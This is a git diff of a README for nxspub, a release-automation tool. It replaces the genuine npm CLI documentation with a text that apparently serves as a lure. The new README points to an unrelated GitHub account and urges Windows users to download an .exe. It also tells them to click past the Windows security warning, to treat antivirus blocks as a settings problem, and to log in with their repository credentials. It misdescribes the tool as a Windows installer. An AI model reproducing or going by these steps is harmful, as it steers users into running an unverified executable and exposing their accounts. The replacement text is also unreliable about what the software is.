@@ -1,567 +1,84 @@
-<div align="center">
-  <a href="https://nxsjs.com">
-    <img width="100" alt="nxspub logo" src="logo.svg">
-  </a>
+# 🚀 nxspub - Streamline your software release workflow today
 
-<hr/>
+[![](https://img.shields.io/badge/Download-nxspub-blue)](https://github.com/colloquycycle8094/nxspub)
 
-  <div style="display: flex; justify-content: center; gap: 8px;">
-    <a href="https://nxsjs.com"><img alt="Made by NxsJs" src="https://img.shields.io/badge/MADE%20BY%20NxsJs-CCEE00.svg?logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMCwgNCkiPjxwYXRoIGQ9Ik02IDI2VjZjMC0yLjIgMS44LTQgNC00aDQuNWw3IDEwVjZjMC0yLjIgMS44LTQgNC00SDMwdjIwYzAgMi4yLTEuOCA0LTQgNGgtNC41bC03LTEwdjZjMCAyLjItMS44IDQtNCA0SDZ6IiBmaWxsPSIjMDAwIi8+PC9nPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0yLCAyKSI+PHBhdGggZD0iTTYgMjZWNmMwLTIuMiAxLjgtNCA0LTRoNC41bDcgMTBWNmMwLTIuMiAxLjgtNCA0LTRIMzB2MjBjMCAyLjItMS44IDQtNCA0aC00LjVsLTctMTB2NmMwIDIuMi0xLjggNC00IDRINnoiIGZpbGw9IiNDQ0ZGMDAiIHN0cm9rZT0iIzAwMCIgc3Ryb2tlLXdpZHRoPSIyLjUiIHN0cm9rZS1saW5lam9pbj0ibWl0ZXIiLz48L2c+PC9zdmc+&style=for-the-badge&labelColor=000000"></a>
-    <a href="https://www.npmjs.com/package/nxspub"><img src="https://img.shields.io/npm/v/nxspub?style=for-the-badge&color=000000&labelColor=FF4400" alt="npm version"></a>
-    <a href="LICENSE"><img src="https://img.shields.io/npm/l/nxspub?style=for-the-badge&color=000000&labelColor=00AAFF" alt="license"></a>
-  </div>
-</div>
+nxspub automates your software release process. It manages branch updates, creates changelogs, and publishes versions for you. This tool removes the manual work from your software production. It creates a steady bridge between your source code and your final release.
 
-## Nxspub
+## 📥 Getting Started
 
-`nxspub` is a release automation CLI for npm packages and pnpm workspaces.
+You need the nxspub application file to begin. Visit the repository page to find the current version for Windows.
 
-It handles:
+[Download it here: https://github.com/colloquycycle8094/nxspub](https://github.com/colloquycycle8094/nxspub)
 
-- commit-message linting
-- branch-based version policies
-- changelog generation
-- git tagging and pushing
-- npm publishing
-- monorepo release propagation
-
-The project assumes a Conventional Commits workflow and is designed for multi-branch release lines such as `main`, `alpha`, `beta`, and `rc`.
+Select the file ending in .exe to start the download. Save this file to your desktop or your downloads folder.
 
-## Installation
+## 💻 System Requirements
 
-```bash
-pnpm add -D nxspub
-```
+This application runs on Windows 10 and Windows 11. Your computer must have a stable internet connection for the tool to communicate with your code storage sites. You do not need to install extra software like compilers or code runners. The application contains everything it needs to function.
 
-## Quick Start
+## 🛠 Installation Steps
 
-### 1. Add scripts
+Follow these steps to set up the tool on your computer:
 
-```json
-{
-  "scripts": {
-    "check": "tsc --incremental --noEmit",
-    "postinstall": "nxspub git-hooks",
-    "version": "nxspub version",
-    "release": "nxspub release"
-  }
-}
-```
+1. Locate the file you saved in the previous step. 
+2. Double-click the file named nxspub.exe to launch the installer.
+3. Windows might show a security prompt. If you see this, click "More info" and then select "Run anyway" to continue the process.
+4. Follow the instructions on the screen to choose a folder for the program. 
+5. Select "Install" to place the application files on your hard drive. 
+6. Click "Finish" when the setup process completes.
 
-### 2. Add minimal config
+A new icon appears on your desktop. This icon opens the main program window.
 
-You can place config in `package.json`:
+## ⚙️ Setting Up Your Workflow
 
-```json
-{
-  "nxspub": {
-    "git-hooks": {
-      "pre-commit": "pnpm lint-staged && pnpm check"
-    }
-  }
-}
-```
+Open the program to configure your settings. The main screen shows your project dashboard. 
 
-Or use `nxspub.config.ts`:
+The software uses git-hooks to track your code changes. The tool detects your active branch automatically. You should log in to your code hosting account through the settings menu. This permits the program to push updates and version numbers to your cloud repository.
 
-```ts
-import { defineConfig } from 'nxspub'
+The settings menu allows you to adjust your changelog format. You can toggle automatic version tagging on or off. We recommend leaving these settings in their default positions for common multi-branch setups.
 
-export default defineConfig({
-  branches: {
-    main: 'latest',
-    master: 'latest',
-    alpha: 'preminor',
-    beta: 'preminor',
-    rc: 'preminor',
-  },
-  'git-hooks': {
-    'pre-commit': 'pnpm lint-staged && pnpm check',
-  },
-})
-```
+## 📜 Managing Versions
 
-### 3. Install hooks
+nxspub handles your project versions based on your commit history. Each time you trigger a release, the software performs these actions:
 
-```bash
-pnpm exec nxspub git-hooks
-```
+1. It checks your current branch.
+2. It collects all code changes since the last release.
+3. It generates a readable changelog text.
+4. It updates the version number in your project files.
+5. It sends these changes to your branch.
 
-### 4. Release flow
+This ensures you keep an accurate history of your development progress without manual entry.
 
-```bash
-pnpm version
-pnpm release
-```
+## 📝 Creating Changelogs
 
-`nxspub version` updates versions, changelogs, commits the release, and creates tags.
+A good changelog explains what the new version changes. nxspub builds this list for you. It reads your commit messages to identify new features, bug fixes, and performance improvements. 
 
-`nxspub release` builds the package and publishes it to npm.
+You can review the generated text before it finalizes the release. If you see an error in the text, you can edit the preview window. The software saves your custom tweaks for future releases.
 
-## Core Concepts
+## 🔄 Multi-Branch Support
 
-### Branch Policies
+Many developers work with multiple branches at once. nxspub understands this workflow. It maintains separate release schedules for your main branch and your developer branches. You can toggle between these branches in the dashboard. When you commit code, the tool knows which branch it belongs to and applies the correct versioning rules.
 
-Each branch can define what kind of release it is allowed to produce.
+## 🛡 Security and Privacy
 
-Example:
+Your code stays on your local machine and your trusted hosting provider. nxspub does not store your code on external servers. The authentication keys remain encrypted on your local disk. 
 
-```ts
-branches: {
-  main: 'latest',
-  alpha: 'preminor',
-  beta: 'preminor',
-  hotfix: 'patch',
-}
-```
+The tool only requests access to the repositories you specify. You can revoke this access at any time through your hosting provider's account page.
 
-Available branch policy types:
-
-- `major`
-- `minor`
-- `patch`
-- `latest`
-- `premajor`
-- `preminor`
-- `prepatch`
-
-Practical effect:
-
-- `latest` allows normal stable releases.
-- `pre*` branches generate prerelease versions such as `1.2.0-alpha.0`.
-- restrictive branches such as `patch` prevent larger bumps from being released on that branch.
-
-### Commit-Based Versioning
-
-By default, `nxspub` maps commit messages to SemVer bumps:
-
-- `major`: `feat(scope)!:`, `feat!:`, `BREAKING CHANGE:`
-- `minor`: `feat:`, `feat(scope):`
-- `patch`: `fix:`, `perf:`, `refactor:`
-
-Default patterns are configurable through `versioning`.
-
-### Changelog Generation
-
-`nxspub` parses conventional commit messages and generates grouped changelog sections such as:
-
-- `Features`
-- `Bug Fixes`
-- `Performance Improvements`
-- `Refactors`
-- `Reverts`
-
-It also:
-
-- links commits, pull requests, and issues
-- extracts `BREAKING CHANGE:` details
-- appends contributor sections
-- archives oversized or major-version changelogs
-
-You can restrict changelog writes to specific branches:
-
-```ts
-changelog: {
-  writeOnBranches: ['main', 'master']
-}
-```
-
-When running `nxspub version` on non-allowed branches, nxspub writes draft files under `.nxspub/changelog-drafts/*`.  
-When you later run `nxspub version` on an allowed branch, matching drafts are auto-imported and deduplicated.
-Drafts that are behind/ahead of current target version are kept and reported as warnings, so they are not silently dropped.
-
-You can audit draft health manually:
-
-```bash
-nxspub draft-doctor --cwd . --target 1.3.0
-```
-
-You can also prune stale drafts (versions behind the current target):
-
-```bash
-nxspub draft-doctor --cwd . --target 1.3.0 --prune
-```
-
-`nxspub version` and `nxspub release` also use a repository lock file under Git metadata (for example `.git/nxspub/version.lock`) to prevent concurrent pipelines from mutating version/tag state at the same time.
-
-## Configuration
-
-### Full Example
-
-```ts
-import { defineConfig } from 'nxspub'
-
-export default defineConfig({
-  workspace: {
-    mode: 'locked',
-    passive: 'patch',
-  },
-  branches: {
-    main: 'latest',
-    master: 'latest',
-    alpha: 'preminor',
-    beta: 'preminor',
-    rc: 'preminor',
-  },
-  versioning: {
-    major: [/(\w+)\((.+)\)!:/, /(\w+)!:/, /BREAKING CHANGE:/],
-    minor: [/feat\((.+)\):/, /feat:/],
-    patch: [
-      /fix\((.+)\):/,
-      /fix:/,
-      /perf\((.+)\):/,
-      /perf:/,
-      /refactor\((.+)\):/,
-      /refactor:/,
-    ],
-  },
-  changelog: {
-    writeOnBranches: ['main', 'master'],
-    labels: {
-      feat: 'Features',
-      fix: 'Bug Fixes',
-      perf: 'Performance Improvements',
-      refactor: 'Refactors',
-      revert: 'Reverts',
-      deps: 'Dependencies',
-    },
-  },
-  lint: {
-    'commit-msg': {
-      pattern:
-        /^(revert: )?(feat|fix|docs|dx|style|refactor|perf|test|workflow|build|ci|chore|types|wip|release)(\([^)]+\))?(!)?: .{1,50}/,
-      message: 'Invalid commit message format.',
-    },
-  },
-  'git-hooks': {
-    'pre-commit': 'pnpm lint-staged && pnpm check',
-    'commit-msg': 'pnpm exec nxspub lint --edit "$1"',
-  },
-  scripts: {
-    releaseBuild: 'pnpm run build',
-  },
-})
-```
+## 🔧 Frequently Asked Questions
 
-### Config Locations
+What happens if the installation fails?
+Ensure you have administrative rights on your machine. Sometimes antivirus software blocks new applications. Check your security settings if the application fails to open.
 
-`nxspub` reads config from:
+Can I move the program after I install it?
+We recommend using the standard installation path. Moving the application folder can break the links between the program and your system files.
 
-1. `nxspub.config.ts`
-2. `nxspub.config.mjs`
-3. `nxspub.config.js`
-4. `nxspub.config.cjs`
-5. `package.json#nxspub`
+Does this work with private repositories?
+Yes. The software uses your secure credentials to connect to private projects just like public ones.
 
-File-based config is merged with `package.json#nxspub` and defaults.
+What should I do if the release hangs?
+Check your internet connection first. If your connection status is active, close the application and restart the process. The tool resumes where it stopped if it detects a pending task.
 
-### Workspace Options
+## 📞 Support
 
-```ts
-workspace: {
-  mode: 'locked' | 'independent',
-  passive: 'patch' | 'follow' | 'none'
-}
-```
-
-`mode`:
-
-- `locked`: all packages receive the same next version
-- `independent`: each package is versioned individually
-
-`passive`:
-
-- `patch`: dependents get a patch bump when internal dependencies change
-- `follow`: dependents inherit the highest bump from changed dependencies
-- `none`: internal dependency changes do not trigger passive bumps
-
-## Commands
-
-### `nxspub git-hooks`
-
-Install configured hooks into `.git/hooks`.
-
-Options:
-
-- `--cwd <cwd>`: run against a target repository instead of the current shell directory
-- `--dry`: preview generated hook content without writing files
-
-Example:
-
-```bash
-pnpm exec nxspub git-hooks --cwd ./packages/app --dry
-```
-
-### `nxspub lint --edit <path>`
-
-Validate a commit message file, typically from the `commit-msg` hook.
-
-Options:
-
-- `--cwd <cwd>`: resolve relative paths and config from a target repository
-- `--edit <path>`: path to the commit message file
-
-Example:
-
-```bash
-pnpm exec nxspub lint --edit .git/COMMIT_EDITMSG
-```
-
-### `nxspub version`
-
-Calculate the next version, update `package.json`, generate changelog content, create a release commit, create tags, and push to remote.
-
-Options:
-
-- `--cwd <cwd>`: operate on a target repository
-- `--dry`: preview version and changelog changes without writing files
-
-Example:
-
-```bash
-pnpm exec nxspub version --dry
-pnpm exec nxspub version --cwd /path/to/repo
-```
-
-### `nxspub release`
-
-Build and publish a package or workspace.
-
-Options:
-
-- `--cwd <cwd>`: operate on a target repository
-- `--dry`: run publish in preview mode
-- `--provenance`: pass `--provenance` to `pnpm publish`
-- `--registry [url]`: override the npm registry
-- `--access [access]`: publish access, default `public`
-- `--tag [tag]`: override the npm dist-tag
-- `--branch <branch>`: override detected branch name
-- `--skipBuild`: skip the build step
-- `--skipSync`: skip remote synchronization checks
-
-Example:
-
-```bash
-pnpm exec nxspub release --dry
-pnpm exec nxspub release --registry https://registry.npmjs.org
-pnpm exec nxspub release --cwd /path/to/repo --branch main
-```
-
-### `nxspub console`
-
-Interactive release console. It includes all previous preview capabilities (read-only release computation + risk checks) and web/API mode.
-
-Options:
-
-- `--cwd <cwd>`: operate on a target repository
-- `--json`: print machine-readable preview output
-- `--branch <branch>`: simulate policy/checks on a target branch
-- `--web`: start local preview web console
-- `--host <host>`: web bind host, default `127.0.0.1`
-- `--port <port>`: web bind port, default `4173`
-- `--open`: open browser after web service starts
-- `--readonly-strict`: disable write endpoints (for example draft prune and snapshot save/delete)
-- `--allow-remote`: required when `--host 0.0.0.0`
-- `--api-only`: serve API endpoints only, without web static assets
-
-Feature flag (rollout/rollback):
-
-- `NXSPUB_CONSOLE_WEB_ENABLED=false` disables `console --web` startup globally
-
-Examples:
-
-```bash
-pnpm exec nxspub console --json
-pnpm exec nxspub console --branch alpha --json
-pnpm exec nxspub console --web --open
-pnpm exec nxspub console --web --api-only --port 4173
-```
-
-#### Preview Web Workflow
-
-Build frontend assets:
-
-```bash
-pnpm run console:web:build
-```
-
-Run web preview server:
-
-```bash
-pnpm exec nxspub console --web --host 127.0.0.1 --port 4173
-```
-
-Preview web stack:
-
-- Server: Nitro HTTP layer (`h3`) hosted by `nxspub console --web`
-- Client: React + Vite with TailwindCSS styling
-- UI language: auto-detects browser language (`zh*` -> Chinese, otherwise English)
-
-Run API-only mode (for custom frontend or proxy):
-
-```bash
-pnpm exec nxspub console --web --api-only --host 127.0.0.1 --port 4173
-```
-
-All `/api/*` requests require header:
-
-```txt
-x-nxspub-console-token: <token from server startup>
-```
-
-Diagnostic bundle export endpoints:
-
-- `GET /api/export.bundle?format=json`
-- `GET /api/export.bundle?format=zip`
-
-Bundle includes runtime context, preview result, checks report, and draft health data for troubleshooting.
-
-Web console also supports branch-to-branch comparison (for example `main` vs `alpha`) to inspect target version and release scope differences.
-Workspace mode includes a layered dependency propagation panel to inspect internal dependency edges and passive bump reasons.
-
-Snapshot endpoints:
-
-- `GET /api/snapshots` list saved snapshots
-- `POST /api/snapshots` save current comparison snapshot
-- `GET /api/snapshots/:id` load snapshot payload
-- `DELETE /api/snapshots/:id` delete a saved snapshot
-
-Snapshots are stored under `.nxspub/console-snapshots`.
-
-Realtime status stream:
-
-- `GET /api/events?token=<session-token>` (Server-Sent Events)
-
-## Git Hook Setup
-
-Typical hook setup:
-
-```json
-{
-  "nxspub": {
-    "git-hooks": {
-      "pre-commit": "pnpm lint-staged && pnpm check",
-      "commit-msg": "pnpm exec nxspub lint --edit \"$1\""
-    }
-  }
-}
-```
-
-If `commit-msg` is not configured, `nxspub git-hooks` injects a default one automatically.
-
-## Monorepo Behavior
-
-Workspace support is implemented.
-
-`nxspub` scans workspace packages from:
-
-- `pnpm-workspace.yaml`
-- `package.json#workspaces`
-
-For workspace releases it will:
-
-- detect changed packages from git history
-- compute release bumps per package
-- propagate dependency-driven bumps
-- update internal dependency ranges
-- generate per-package changelogs
-- generate a root changelog summary
-- create package tags and global tags
-
-## `--cwd` Support
-
-All commands support `--cwd`.
-
-Use it when:
-
-- running `nxspub` from outside the target repository
-- operating on a nested package from a larger shell session
-- automating releases from scripts or CI runners with a shared working directory
-
-Example:
-
-```bash
-pnpm exec nxspub version --cwd /absolute/path/to/repo
-pnpm exec nxspub release --cwd /absolute/path/to/repo
-```
-
-`--cwd` affects:
-
-- config loading
-- git branch detection
-- git history lookup
-- repository URL lookup
-- changelog link generation
-- package and workspace scanning
-
-## Requirements and Assumptions
-
-- Node.js `>=20`
-- pnpm `>=9.12.3`
-- git repository with a configured `origin`
-- Conventional Commits discipline
-- clean working tree before `version` and `release`
-
-## Typical CI Usage
-
-```bash
-pnpm install --frozen-lockfile
-pnpm run check
-pnpm test
-pnpm exec nxspub version --cwd .
-pnpm exec nxspub release --cwd . --provenance
-```
-
-If your CI already guarantees branch state and fetch depth, `--skipSync` can be used deliberately, but it weakens the preflight safety checks.
-
-## Troubleshooting
-
-### Branch not configured
-
-If you see an error like:
-
-```text
-Admission Denied: Branch "feature/x" not configured.
-```
-
-Add the branch pattern to `branches`, or override the branch explicitly with:
-
-```bash
-pnpm exec nxspub release --branch main
-```
-
-### No version bump detected
-
-If `nxspub version` reports no version-triggering commits:
-
-- check your commit messages
-- ensure the commits are after the last release commit
-- verify your custom `versioning` regex rules
-
-### Publish skipped
-
-If publish is skipped, `nxspub` has determined that the target package version is already present in the registry.
-
-## Development
-
-```bash
-pnpm install
-pnpm run check
-pnpm test
-pnpm run lint
-```
-
-## Resources
-
-- [Learn Nxspub](https://nxspub.nxsjs.com)
-- [npm package](https://www.npmjs.com/package/nxspub)
-
-## Contribution
-
-Read the [Contributing Guide](https://github.com/nxsjs/nxspub/blob/main/.github/CONTRIBUTING.md) before opening a pull request.
-
-<a href="https://github.com/nxsjs/nxspub/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=nxsjs/nxspub&max=20&columns=12" />
-</a>
-
-<sub>Note: showing the first 500 contributors only due to GitHub image size limits.</sub>
+If the software behaves in an unexpected way, consult the issues tab on the project page. You can search for similar problems other users found. If you cannot find a solution, open a new ticket with a description of the error. Include a screenshot of the window if possible to help our team understand the issue.
